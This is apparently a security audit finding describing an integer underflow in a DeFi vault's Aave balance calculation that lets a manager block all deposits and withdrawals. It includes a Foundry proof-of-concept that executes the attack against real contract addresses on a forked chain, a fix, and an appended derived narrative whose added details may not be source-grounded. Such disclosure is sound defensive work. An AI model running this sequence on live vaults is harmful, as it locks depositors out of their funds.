---
id: 22934
severity: "High"
---

# Integer underflow will cause a DoS on new de-

## Description

In some scenarios, an integer underflow on AaveLendingPoolAssetGuard::getBalance will cause a DoS on all new deposits and withdrawals. The manager can trigger this bug to prevent users from withdrawing funds from the Vault, which shouldn't be possible according to the README. The contract AaveLendingPoolAssetGuard is the asset guard of the Aave Lending Pool contract, and is used to get the current balance on Aave and to process Aave withdrawals. The function that tracks the balance on Aave that the Vault currently has is called getBalance:
```solidity
function getBalance(address pool, address) public view override returns (uint256 balance) {
    IHasSupportedAsset poolManagerLogicAssets = IHasSupportedAsset(IPoolLogic(pool).poolManagerLogic());

    IHasSupportedAsset.Asset[] memory supportedAssets = poolManagerLogicAssets.getSupportedAssets();

    uint256 length = supportedAssets.length;
    for (uint256 i = 0; i < length; i++) {
        address asset;
        uint256 collateralBalance;
        uint256 debtBalance;
        uint256 tokenPriceInUsd;
        uint256 decimals;
        uint256 totalCollateralInUsd;
        uint256 totalDebtInUsd;

        asset = supportedAssets[i].asset;
        // Lending/Borrowing enabled asset
        if (IHasAssetInfo(factory).getAssetType(asset) == 4 || IHasAssetInfo(factory).getAssetType(asset) == 14) {
            (collateralBalance, debtBalance, decimals) = _calculateAaveBalance(pool, asset);

            if (collateralBalance != 0 || debtBalance != 0) {
                tokenPriceInUsd = IHasAssetInfo(factory).getAssetPrice(asset);
                totalCollateralInUsd = totalCollateralInUsd.add(tokenPriceInUsd.mul(collateralBalance).div(10 ** decimals));
                totalDebtInUsd = totalDebtInUsd.add(tokenPriceInUsd.mul(debtBalance).div(10 ** decimals));
            }
        }
    }

    balance = totalCollateralInUsd.sub(totalDebtInUsd);
}
```
In the last line of the function, the balance is calculated as the difference between the total collateral and the total debt, however, that exact line will cause an underflow in certain scenarios. Take into account that the accounting of Aave balance is done by looping over the supported assets on the Vault. This means that the Vault may have other collateral tokens in Aave that are not accounted for in the function getBalance. For this reason, when anyone deposits collateral in Aave on behalf of the Vault with non-supported tokens, those tokens won't be accounted for in the Aave balance. In those cases, the getBalance function will only account for the collateral on supported tokens, but it won't see any collateral with non-supported tokens. In that scenario, it's possible that totalCollateralInUsd is lower than totalDebtInUsd, thus causing the underflow. Moreover, the manager can easily trigger this bug by executing the following attack sequence:
1. Deposit some of the Vault's tokens as collateral in Aave (e.g. 1 WETH)
2. Use some non-supported tokens to deposit as collateral in Aave on behalf of the Vault (e.g. 1 rETH)
3. Use the Vault to borrow a number of tokens higher in value than the first collateral deposited (e.g. 5,000 USDC)
After step 3, each time that any user wants to deposit or withdraw from the Vault, the function _mintManagerFee will be called, which will call AaveLendingPoolAssetGuard::getBalance, which will revert because the accounted debt (5,000 USDC) is higher than the accounted collateral (1 WETH). Also, this bug could be accidentally caused by the external market conditions. Imagine that there's a flash crash and the Vault's position in Aave is liquidated, seizing all collateral but leaving some bad debt. In this scenario, the accounted debt would also be higher than the accounted collateral so new deposits and withdrawals within the Vault would be DoSed. The manager can cause a DoS on all deposits and withdrawals on the Vault. This bug directly breaks a restriction stated in the README: Depositor under any circumstances should be able to withdraw funds they've invested according to the value of their vault shares given that no lock up is applied. Moreover, this bug can be triggered by the manager of a Vault without limitations or external conditions, and that's why I believe it warrants high severity.

## Proof of Concept

The following PoC is a test that forks the Optimism blockchain and executes the attack on a Vault. The test can be pasted in any Foundry environment and can be run with the command forge test --match-test test_DoS_aave. Additionally, you must have the following lines in the .env file in order for the test to fork the blockchain:
OPTIMISM_RPC_URL=https://opt-mainnet.g.alchemy.com/v2/{key}
```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.13;

import {Test} from "forge-std/Test.sol";

interface IPoolLogic {
    function execTransaction(address to, bytes calldata data) external returns (bool success);
    function mintManagerFee() external;
}

interface IAavePool {
    function deposit(address, uint256, address, uint16) external;
    function borrow(address, uint256, uint256, uint16, address) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

contract PoolTest is Test {
    IPoolLogic pool = IPoolLogic(0x749E1d46C83f09534253323A43541A9d2bBD03AF);
    address managerAddress = 0xeFc4904b786A3836343A3A504A2A3cb303b77D64;
    IAavePool aaveLendingPool = IAavePool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);

    IERC20 WETH = IERC20(0x4200000000000000000000000000000000000006);
    IERC20 USDC = IERC20(0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85);
    IERC20 RETH = IERC20(0x9Bcef72be871e61ED4fBbc7630889beE758eb81D);
    uint256 opFork;
    string OPTIMISM_RPC_URL = vm.envString("OPTIMISM_RPC_URL");

    function setUp() public {
        // Create Optimism fork
        opFork = vm.createSelectFork(OPTIMISM_RPC_URL);
        assertEq(opFork, vm.activeFork());
        vm.rollFork(121348913); // Jun-13-2024 04:36:43 PM +UTC
    }

    function test_DoS_aave() public {
        // First, simulate the pool getting 1 WETH
        deal(address(WETH), address(pool), 1e18);

        // Approve 1 WETH to the Aave lending pool
        bytes memory data = abi.encodeWithSelector(WETH.approve.selector, address(aaveLendingPool), 1e18);

        vm.prank(managerAddress);
        pool.execTransaction(address(WETH), data);

        // Supply 1 WETH to the Aave lending pool
        data = abi.encodeWithSelector(aaveLendingPool.deposit.selector, address(WETH), 1e18, address(pool), 0);

        vm.prank(managerAddress);
        pool.execTransaction(address(aaveLendingPool), data);

        // The manager deposits 1 rETH on behalf of the pool
        deal(address(RETH), managerAddress, 1e18);
        vm.startPrank(managerAddress);
        RETH.approve(address(aaveLendingPool), 1e18);
        aaveLendingPool.deposit(address(RETH), 1e18, address(pool), 0);
        vm.stopPrank();

        // Borrow some USDC
        data = abi.encodeWithSelector(aaveLendingPool.borrow.selector, address(USDC), 5_000e6, 2, 0, address(pool));

        vm.prank(managerAddress);
        pool.execTransaction(address(aaveLendingPool), data);

        // Try to mint the manager fee (which is triggered every deposit and withdrawal)
        // DoS
        vm.expectRevert("SafeMath: subtraction overflow");
        pool.mintManagerFee();
    }
}
```
The above test shows how the manager can trigger a DoS on all deposits and withdrawals by using an integer underflow error.

## Recommendation

To mitigate this issue is recommended to floor at zero the subtraction at getBalance to avoid any underflow when the accounted collateral is lower than the accounted debt.
```solidity
// balance = totalCollateralInUsd.sub(totalDebtInUsd);
if (totalDebtInUsd > totalCollateralInUsd) {
    balance = 0;
} else {
    balance = totalCollateralInUsd.sub(totalDebtInUsd);
}
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is an integer underflow in the AaveLendingPoolAssetGuard.getBalance function that can turn the whole vault into a denial‑of‑service (DoS) for deposits and withdrawals. The function calculates the vault’s reported balance by iterating over the list of supported assets, summing the USD value of collateral and debt for each, and finally returning totalCollateralInUsd.sub(totalDebtInUsd). Because the subtraction is performed without a safety check, a situation where the summed collateral is lower than the summed debt causes an underflow and the transaction reverts with a SafeMath overflow error. This mismatch can happen when the vault holds collateral in assets that are not part of the supported‑asset list – for example, a manager deposits a supported token such as WETH, then adds a non‑supported token like rETH on behalf of the vault, and subsequently borrows a larger amount of stablecoins. The unsupported token is ignored by getBalance, so totalCollateralInUsd reflects only the supported token while totalDebtInUsd reflects the full borrowed amount, making debt > collateral. The underflow is triggered each time the vault calls _mintManagerFee, which invokes getBalance during any deposit or withdrawal, causing those operations to revert. The same condition can also arise unintentionally after a market flash crash that liquidates supported collateral but leaves residual debt, again leaving debt higher than the accounted collateral. From a user’s perspective deposits and withdrawals suddenly fail with a subtraction overflow error, balances appear unchanged, and the UI may show no funds being returned despite having vault shares. The issue violates the protocol’s guarantee that depositors can always withdraw their proportional share when no lock‑up is applied. It was discovered during a security audit through static analysis of the balance calculation and confirmed with a Foundry test that reproduces the underflow on an Optimism fork. The bug is hard to notice because the underflow only occurs with a specific combination of supported and unsupported assets or extreme market conditions, and the subtraction line looks innocuous. The recommended mitigation is to guard the subtraction by flooring the result at zero – i.e., if totalDebtInUsd exceeds totalCollateralInUsd, set balance to zero instead of allowing an underflow – or to use a safe subtraction function that reverts with a clear error message. This change restores the invariant that the reported balance never becomes negative and prevents the vault from being locked out of deposits and withdrawals.
